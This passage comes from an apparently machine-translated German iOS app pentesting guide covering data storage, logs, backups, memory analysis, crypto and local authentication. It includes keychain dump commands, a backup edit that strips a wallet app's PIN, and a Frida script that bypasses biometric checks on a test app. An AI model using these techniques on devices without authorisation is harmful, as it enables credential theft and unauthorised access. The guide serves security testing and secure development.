Es wird **empfohlen, das Caching dieser Daten zu deaktivieren**, da es sensible Informationen in der Anfrage oder Antwort enthalten kann. Die folgende Liste zeigt verschiedene M√∂glichkeiten, dies zu erreichen:

1. Es wird empfohlen, zwischengespeicherte Antworten nach dem Logout zu entfernen. Dies kann mit der von Apple bereitgestellten Methode [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) erfolgen. Sie k√∂nnen diese Methode wie folgt aufrufen:

`URLCache.shared.removeAllCachedResponses()`

Diese Methode entfernt alle zwischengespeicherten Anfragen und Antworten aus der Cache.db-Datei.
2. Wenn Sie den Vorteil von Cookies nicht nutzen m√ºssen, wird empfohlen, einfach die [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) Konfigurationseigenschaft von URLSession zu verwenden, die das Speichern von Cookies und Caches deaktiviert.

[Apple-Dokumentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Ein tempor√§res Sitzungs-Konfigurationsobjekt ist √§hnlich wie ein Standard-Sitzungs-Konfigurationsobjekt (siehe Standard), mit dem Unterschied, dass das entsprechende Sitzungsobjekt keine Caches, Anmeldeinformationen oder andere sitzungsbezogene Daten auf der Festplatte speichert. Stattdessen werden sitzungsbezogene Daten im RAM gespeichert. Das einzige Mal, dass eine tempor√§re Sitzung Daten auf die Festplatte schreibt, ist, wenn Sie ihr sagen, den Inhalt einer URL in eine Datei zu schreiben.`
3. Der Cache kann auch deaktiviert werden, indem die Cache-Richtlinie auf [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) gesetzt wird. Dadurch wird das Speichern des Caches in irgendeiner Form, entweder im Speicher oder auf der Festplatte, deaktiviert.

### Snapshots

Immer wenn Sie die Home-Taste dr√ºcken, **nimmt iOS einen Snapshot des aktuellen Bildschirms** auf, um den √úbergang zur Anwendung viel reibungsloser zu gestalten. Wenn jedoch **sensible** **Daten** auf dem aktuellen Bildschirm vorhanden sind, werden sie im **Bild** **gespeichert** (das **√ºber** **Neustarts** **hinaus** **besteht**). Dies sind die Snapshots, auf die Sie auch zugreifen k√∂nnen, indem Sie doppelt auf den Home-Bildschirm tippen, um zwischen Apps zu wechseln.

Es sei denn, das iPhone ist jailbreaked, muss der **Angreifer** **Zugriff** auf das **Ger√§t** **entblockt** haben, um diese Screenshots zu sehen. Standardm√§√üig wird der letzte Snapshot im Sandbox der Anwendung im `Library/Caches/Snapshots/` oder `Library/SplashBoard/Snapshots`-Ordner gespeichert (vertrauensw√ºrdige Computer k√∂nnen ab iOS 7.0 nicht auf das Dateisystem zugreifen).

Eine M√∂glichkeit, dieses unerw√ºnschte Verhalten zu verhindern, besteht darin, einen leeren Bildschirm anzuzeigen oder die sensiblen Daten zu entfernen, bevor der Snapshot mit der Funktion `ApplicationDidEnterBackground()` aufgenommen wird.

Die folgende ist eine Beispiel-Ma√ünahme, die einen Standard-Screenshot festlegt.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Ziel-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Dies setzt das Hintergrundbild auf `overlayImage.png`, wann immer die Anwendung in den Hintergrund versetzt wird. Es verhindert das Lecken sensibler Daten, da `overlayImage.png` immer die aktuelle Ansicht √ºberschreibt.

### Keychain

F√ºr den Zugriff auf und die Verwaltung des iOS-Keychains sind Tools wie [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) verf√ºgbar, die f√ºr jailbroken Ger√§te geeignet sind. Dar√ºber hinaus bietet [**Objection**](https://github.com/sensepost/objection) den Befehl `ios keychain dump` f√ºr √§hnliche Zwecke.

#### **Speichern von Anmeldeinformationen**

Die **NSURLCredential**-Klasse ist ideal, um sensible Informationen direkt im Keychain zu speichern, wodurch die Notwendigkeit f√ºr NSUserDefaults oder andere Wrapper umgangen wird. Um Anmeldeinformationen nach dem Login zu speichern, wird der folgende Swift-Code verwendet:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Um diese gespeicherten Anmeldeinformationen zu extrahieren, wird der Befehl `ios nsurlcredentialstorage dump` von Objection verwendet.

## **Benutzerdefinierte Tastaturen und Tastatur-Cache**

Mit iOS 8.0 und h√∂her k√∂nnen Benutzer benutzerdefinierte Tastaturerweiterungen installieren, die unter **Einstellungen > Allgemein > Tastatur > Tastaturen** verwaltet werden k√∂nnen. W√§hrend diese Tastaturen erweiterte Funktionen bieten, besteht das Risiko von Tastenanschlagprotokollierung und der √úbertragung von Daten an externe Server, obwohl die Benutzer √ºber Tastaturen informiert werden, die Netzwerkzugriff ben√∂tigen. Apps k√∂nnen und sollten die Verwendung von benutzerdefinierten Tastaturen f√ºr die Eingabe sensibler Informationen einschr√§nken.

**Sicherheitsempfehlungen:**

* Es wird empfohlen, Drittanbieter-Tastaturen zur Verbesserung der Sicherheit zu deaktivieren.
* Seien Sie sich der Autokorrektur- und Auto-Vervollst√§ndigungsfunktionen der Standard-iOS-Tastatur bewusst, die sensible Informationen in Cache-Dateien speichern k√∂nnten, die sich in `Library/Keyboard/{locale}-dynamic-text.dat` oder `/private/var/mobile/Library/Keyboard/dynamic-text.dat` befinden. Diese Cache-Dateien sollten regelm√§√üig auf sensible Daten √ºberpr√ºft werden. Es wird empfohlen, das Tastaturw√∂rterbuch √ºber **Einstellungen > Allgemein > Zur√ºcksetzen > Tastaturw√∂rterbuch zur√ºcksetzen** zur√ºckzusetzen, um zwischengespeicherte Daten zu l√∂schen.
* Das Abfangen von Netzwerkverkehr kann aufdecken, ob eine benutzerdefinierte Tastatur Tastenanschl√§ge remote √ºbertr√§gt.

### **Verhindern von Textfeld-Caching**

Das [UITextInputTraits-Protokoll](https://developer.apple.com/reference/uikit/uitextinputtraits) bietet Eigenschaften zur Verwaltung der Autokorrektur und der sicheren Texteingabe, die entscheidend sind, um das Caching sensibler Informationen zu verhindern. Zum Beispiel kann das Deaktivieren der Autokorrektur und das Aktivieren der sicheren Texteingabe erreicht werden mit:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Zus√§tzlich sollten Entwickler sicherstellen, dass Textfelder, insbesondere solche zur Eingabe sensibler Informationen wie Passw√∂rter und PINs, das Caching deaktivieren, indem sie `autocorrectionType` auf `UITextAutocorrectionTypeNo` und `secureTextEntry` auf `YES` setzen.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logs**

Das Debuggen von Code beinhaltet oft die Verwendung von **Logging**. Es besteht ein Risiko, da **Logs sensible Informationen enthalten k√∂nnen**. Fr√ºher, in iOS 6 und fr√ºheren Versionen, waren Logs f√ºr alle Apps zug√§nglich, was ein Risiko f√ºr die Offenlegung sensibler Daten darstellte. **Jetzt sind Anwendungen darauf beschr√§nkt, nur auf ihre eigenen Logs zuzugreifen**.

Trotz dieser Einschr√§nkungen kann ein **Angreifer mit physischem Zugriff** auf ein entsperrtes Ger√§t dies ausnutzen, indem er das Ger√§t mit einem Computer verbindet und **die Logs liest**. Es ist wichtig zu beachten, dass Logs auch nach der Deinstallation der App auf der Festplatte verbleiben.

Um Risiken zu mindern, wird empfohlen, **gr√ºndlich mit der App zu interagieren**, alle Funktionen und Eingaben zu erkunden, um sicherzustellen, dass keine sensiblen Informationen versehentlich protokolliert werden.

Bei der √úberpr√ºfung des Quellcodes der App auf potenzielle Leaks sollten sowohl **vordefinierte** als auch **benutzerdefinierte Logging-Anweisungen** gesucht werden, indem nach Schl√ºsselw√∂rtern wie `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` f√ºr integrierte Funktionen und nach Erw√§hnungen von `Logging` oder `Logfile` f√ºr benutzerdefinierte Implementierungen gesucht wird.

### **Monitoring System Logs**

Apps protokollieren verschiedene Informationen, die sensibel sein k√∂nnen. Um diese Logs zu √ºberwachen, k√∂nnen Tools und Befehle wie:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
sind n√ºtzlich. Dar√ºber hinaus bietet **Xcode** eine M√∂glichkeit, Konsolenprotokolle zu sammeln:

1. √ñffnen Sie Xcode.
2. Schlie√üen Sie das iOS-Ger√§t an.
3. Navigieren Sie zu **Fenster** -> **Ger√§te und Simulatoren**.
4. W√§hlen Sie Ihr Ger√§t aus.
5. Ausl√∂sen des Problems, das Sie untersuchen.
6. Verwenden Sie die Schaltfl√§che **Konsole √∂ffnen**, um Protokolle in einem neuen Fenster anzuzeigen.

F√ºr fortgeschrittenes Logging kann das Verbinden mit der Ger√§teshell und die Verwendung von **socat** eine Echtzeit-Protokoll√ºberwachung bieten:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Folgen Sie den Befehlen zur Beobachtung von Protokollaktivit√§ten, die f√ºr die Diagnose von Problemen oder die Identifizierung potenzieller Datenlecks in Protokollen von unsch√§tzbarem Wert sein k√∂nnen.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Backups

**Automatische Backup-Funktionen** sind in iOS integriert und erleichtern die Erstellung von Ger√§tesicherungen √ºber iTunes (bis macOS Catalina), Finder (ab macOS Catalina) oder iCloud. Diese Backups umfassen fast alle Ger√§tedaten, mit Ausnahme von hochsensiblen Elementen wie Apple Pay-Daten und Touch ID-Konfigurationen.

### Sicherheitsrisiken

Die Einbeziehung von **installierten Apps und deren Daten** in Backups wirft das Problem potenzieller **Datenlecks** auf und das Risiko, dass **Backup-Modifikationen die App-Funktionalit√§t √§ndern k√∂nnten**. Es wird empfohlen, **sensible Informationen nicht im Klartext** im Verzeichnis einer App oder deren Unterverzeichnissen zu speichern, um diese Risiken zu mindern.

### Ausschluss von Dateien aus Backups

Dateien in `Documents/` und `Library/Application Support/` werden standardm√§√üig gesichert. Entwickler k√∂nnen bestimmte Dateien oder Verzeichnisse von Backups ausschlie√üen, indem sie `NSURL setResourceValue:forKey:error:` mit dem `NSURLIsExcludedFromBackupKey` verwenden. Diese Praxis ist entscheidend, um sensible Daten vor der Aufnahme in Backups zu sch√ºtzen.

### Testen auf Schwachstellen

Um die Backup-Sicherheit einer App zu bewerten, beginnen Sie mit der **Erstellung eines Backups** √ºber den Finder und suchen Sie es dann mithilfe der Anleitung aus [Apples offizieller Dokumentation](https://support.apple.com/en-us/HT204215). Analysieren Sie das Backup auf sensible Daten oder Konfigurationen, die ge√§ndert werden k√∂nnten, um das Verhalten der App zu beeinflussen.

Sensible Informationen k√∂nnen mit Befehlszeilenwerkzeugen oder Anwendungen wie [iMazing](https://imazing.com) gesucht werden. Bei verschl√ºsselten Backups kann die Anwesenheit der Verschl√ºsselung best√§tigt werden, indem der "IsEncrypted"-Schl√ºssel in der "Manifest.plist"-Datei im Stammverzeichnis des Backups √ºberpr√ºft wird.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
F√ºr den Umgang mit verschl√ºsselten Backups k√∂nnen Python-Skripte aus dem [DinoSec GitHub-Repo](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts), wie **backup\_tool.py** und **backup\_passwd.py**, n√ºtzlich sein, obwohl m√∂glicherweise Anpassungen f√ºr die Kompatibilit√§t mit den neuesten iTunes/Finder-Versionen erforderlich sind. Das [**iOSbackup**-Tool](https://pypi.org/project/iOSbackup/) ist eine weitere Option, um auf Dateien innerhalb von passwortgesch√ºtzten Backups zuzugreifen.

### Modifizieren des App-Verhaltens

Ein Beispiel f√ºr die √Ñnderung des App-Verhaltens durch Backup-Modifikationen wird in der [Bither Bitcoin Wallet-App](https://github.com/bither/bither-ios) demonstriert, wo die UI-Sperr-PIN in `net.bither.plist` unter dem **pin\_code**-Schl√ºssel gespeichert ist. Das Entfernen dieses Schl√ºssels aus der plist und das Wiederherstellen des Backups entfernt die PIN-Anforderung und erm√∂glicht uneingeschr√§nkten Zugriff.

## Zusammenfassung zur Speichertests f√ºr sensible Daten

Beim Umgang mit sensiblen Informationen, die im Speicher einer Anwendung gespeichert sind, ist es entscheidend, die Expositionszeit dieser Daten zu begrenzen. Es gibt zwei Hauptans√§tze zur Untersuchung des Speicherinhalts: **Erstellen eines Speicherdumps** und **Analyse des Speichers in Echtzeit**. Beide Methoden haben ihre Herausforderungen, einschlie√ülich der M√∂glichkeit, kritische Daten w√§hrend des Dump-Prozesses oder der Analyse zu √ºbersehen.

## **Abrufen und Analysieren eines Speicherdumps**

F√ºr sowohl jailbroken als auch nicht-jailbroken Ger√§te erm√∂glichen Tools wie [objection](https://github.com/sensepost/objection) und [Fridump](https://github.com/Nightbringer21/fridump) das Dumpen des Prozessspeichers einer App. Nach dem Dumpen erfordert die Analyse dieser Daten verschiedene Tools, abh√§ngig von der Art der Informationen, nach denen Sie suchen.

Um Strings aus einem Speicherdump zu extrahieren, k√∂nnen Befehle wie `strings` oder `rabin2 -zz` verwendet werden:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
F√ºr eine detailliertere Analyse, einschlie√ülich der Suche nach spezifischen Datentypen oder Mustern, bietet **radare2** umfangreiche Suchm√∂glichkeiten:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Laufzeit-Speicheranalyse**

**r2frida** bietet eine leistungsstarke Alternative zur Inspektion des Speichers einer App in Echtzeit, ohne dass ein Speicherauszug erforderlich ist. Dieses Tool erm√∂glicht die Ausf√ºhrung von Suchbefehlen direkt im Speicher der laufenden Anwendung:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Gebrochene Kryptographie

### Schlechte Schl√ºsselmanagementprozesse

Einige Entwickler speichern sensible Daten im lokalen Speicher und verschl√ºsseln sie mit einem im Code hartcodierten/vorhersehbaren Schl√ºssel. Dies sollte nicht getan werden, da einige Reverse-Engineering-Angriffe es Angreifern erm√∂glichen k√∂nnten, die vertraulichen Informationen zu extrahieren.

### Verwendung unsicherer und/oder veralteter Algorithmen

Entwickler sollten keine **veralteten Algorithmen** verwenden, um Autorisierungs-**pr√ºfungen** durchzuf√ºhren, Daten zu **speichern** oder zu **versenden**. Einige dieser Algorithmen sind: RC4, MD4, MD5, SHA1... Wenn **Hashes** verwendet werden, um Passw√∂rter zu speichern, sollten hash-brute-force-**resistente** Hashes mit Salt verwendet werden.

### √úberpr√ºfung

Die wichtigsten √úberpr√ºfungen, die durchgef√ºhrt werden sollten, sind, ob Sie **hartcodierte** Passw√∂rter/Geheimnisse im Code finden k√∂nnen, oder ob diese **vorhersehbar** sind, und ob der Code eine Art von **schwachen** **Kryptographie**-Algorithmen verwendet.

Es ist interessant zu wissen, dass Sie einige **Krypto**-**Bibliotheken** automatisch mit **objection** √ºberwachen k√∂nnen mit:
```swift
ios monitor crypt
```
F√ºr **weitere Informationen** zu iOS-Kryptografie-APIs und -Bibliotheken besuchen Sie [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Lokale Authentifizierung

**Lokale Authentifizierung** spielt eine entscheidende Rolle, insbesondere wenn es darum geht, den Zugriff an einem entfernten Endpunkt durch kryptografische Methoden zu sch√ºtzen. Das Wesentliche hier ist, dass lokale Authentifizierungsmechanismen ohne ordnungsgem√§√üe Implementierung umgangen werden k√∂nnen.

Apples [**Local Authentication framework**](https://developer.apple.com/documentation/localauthentication) und der [**Schl√ºsselbund**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) bieten robuste APIs f√ºr Entwickler, um Benutzerauthentifizierungsdialoge zu erleichtern und geheime Daten sicher zu verwalten. Der Secure Enclave sichert die Fingerabdruck-ID f√ºr Touch ID, w√§hrend Face ID auf Gesichtserkennung basiert, ohne biometrische Daten zu gef√§hrden.

Um Touch ID/Face ID zu integrieren, haben Entwickler zwei API-Optionen:

* **`LocalAuthentication.framework`** f√ºr die hochgradige Benutzerauthentifizierung ohne Zugriff auf biometrische Daten.
* **`Security.framework`** f√ºr den Zugriff auf niedrigere Schl√ºsselbunddienste, die geheime Daten mit biometrischer Authentifizierung sichern. Verschiedene [Open-Source-Wrappers](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) erleichtern den Zugriff auf den Schl√ºsselbund.

{% hint style="danger" %}
Beide `LocalAuthentication.framework` und `Security.framework` weisen jedoch Schwachstellen auf, da sie haupts√§chlich boolesche Werte zur√ºckgeben, ohne Daten f√ºr Authentifizierungsprozesse zu √ºbertragen, was sie anf√§llig f√ºr Umgehungen macht (siehe [Don't touch me that way, von David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementierung der lokalen Authentifizierung

Um Benutzer zur Authentifizierung aufzufordern, sollten Entwickler die **`evaluatePolicy`**-Methode innerhalb der **`LAContext`**-Klasse verwenden und zwischen folgenden Optionen w√§hlen:

* **`deviceOwnerAuthentication`**: Fordert Touch ID oder Ger√§te-Passcode an und schl√§gt fehl, wenn keines aktiviert ist.
* **`deviceOwnerAuthenticationWithBiometrics`**: Fordert ausschlie√ülich Touch ID an.

Eine erfolgreiche Authentifizierung wird durch einen booleschen R√ºckgabewert von **`evaluatePolicy`** angezeigt, was auf eine potenzielle Sicherheitsanf√§lligkeit hinweist.

### Lokale Authentifizierung mit Schl√ºsselbund

Die Implementierung der **lokalen Authentifizierung** in iOS-Apps umfasst die Verwendung von **Schl√ºsselbund-APIs**, um geheime Daten wie Authentifizierungstoken sicher zu speichern. Dieser Prozess stellt sicher, dass die Daten nur vom Benutzer mit seinem Ger√§te-Passcode oder biometrischer Authentifizierung wie Touch ID abgerufen werden k√∂nnen.

Der Schl√ºsselbund bietet die M√∂glichkeit, Elemente mit dem Attribut `SecAccessControl` festzulegen, das den Zugriff auf das Element einschr√§nkt, bis der Benutzer erfolgreich √ºber Touch ID oder Ger√§te-Passcode authentifiziert. Diese Funktion ist entscheidend f√ºr die Verbesserung der Sicherheit.

Im Folgenden finden Sie Codebeispiele in Swift und Objective-C, die zeigen, wie man einen String im Schl√ºsselbund speichert und abruft, wobei diese Sicherheitsfunktionen genutzt werden. Die Beispiele zeigen speziell, wie man den Zugriffskontrollmechanismus einrichtet, um eine Touch ID-Authentifizierung zu verlangen und sicherzustellen, dass die Daten nur auf dem Ger√§t zug√§nglich sind, auf dem sie eingerichtet wurden, vorausgesetzt, ein Ger√§te-Passcode ist konfiguriert.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Jetzt k√∂nnen wir das gespeicherte Element aus dem Schl√ºsselbund anfordern. Die Schl√ºsselbunddienste zeigen dem Benutzer den Authentifizierungsdialog an und geben Daten oder nil zur√ºck, abh√§ngig davon, ob ein geeigneter Fingerabdruck bereitgestellt wurde oder nicht.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Erkennung

Die Verwendung von Frameworks in einer App kann auch durch die Analyse der Liste der gemeinsam genutzten dynamischen Bibliotheken der App-Bin√§rdatei erkannt werden. Dies kann mit `otool` durchgef√ºhrt werden:
```bash
$ otool -L <AppName>.app/<AppName>
```
Wenn `LocalAuthentication.framework` in einer App verwendet wird, enth√§lt die Ausgabe beide der folgenden Zeilen (denken Sie daran, dass `LocalAuthentication.framework` unter der Haube `Security.framework` verwendet):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Wenn `Security.framework` verwendet wird, wird nur die zweite angezeigt.

### Umgehung des lokalen Authentifizierungsrahmens

#### **Objection**

Durch die **Objection Biometrics Bypass**, die auf [dieser GitHub-Seite](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) zu finden ist, steht eine Technik zur Verf√ºgung, um den **LocalAuthentication**-Mechanismus zu √ºberwinden. Der Kern dieses Ansatzes besteht darin, **Frida** zu nutzen, um die Funktion `evaluatePolicy` zu manipulieren, sodass sie konsequent ein `True`-Ergebnis liefert, unabh√§ngig vom tats√§chlichen Erfolg der Authentifizierung. Dies ist besonders n√ºtzlich, um fehlerhafte biometrische Authentifizierungsprozesse zu umgehen.

Um diese Umgehung zu aktivieren, wird der folgende Befehl verwendet:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Dieser Befehl l√∂st eine Sequenz aus, bei der Objection eine Aufgabe registriert, die das Ergebnis der `evaluatePolicy`-√úberpr√ºfung effektiv auf `True` √§ndert.

#### Frida

Ein Beispiel f√ºr die Verwendung von **`evaluatePolicy`** aus der [DVIA-v2-Anwendung](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Um den **bypass** der lokalen Authentifizierung zu erreichen, wird ein Frida-Skript geschrieben. Dieses Skript zielt auf die **evaluatePolicy**-√úberpr√ºfung ab und f√§ngt deren Callback ab, um sicherzustellen, dass er **success=1** zur√ºckgibt. Durch die √Ñnderung des Verhaltens des Callbacks wird die Authentifizierungs√ºberpr√ºfung effektiv umgangen.

Das folgende Skript wird injiziert, um das Ergebnis der **evaluatePolicy**-Methode zu √§ndern. Es √§ndert das Ergebnis des Callbacks, um immer Erfolg anzuzeigen.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Um das Frida-Skript zu injizieren und die biometrische Authentifizierung zu umgehen, wird der folgende Befehl verwendet:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Sensible Funktionalit√§tsexposition durch IPC

### Benutzerdefinierte URI-Handler / Deeplinks / Benutzerdefinierte Schemes

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Universelle Links

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity Sharing

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### App-Erweiterungen

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serialisierung und Kodierung

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Netzwerkkommunikation

Es ist wichtig zu √ºberpr√ºfen, dass keine Kommunikation **ohne Verschl√ºsselung** erfolgt und dass die Anwendung das **TLS-Zertifikat** des Servers korrekt **validiert**.\
Um solche Probleme zu √ºberpr√ºfen, k√∂nnen Sie einen Proxy wie **Burp** verwenden:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Hostname-√úberpr√ºfung

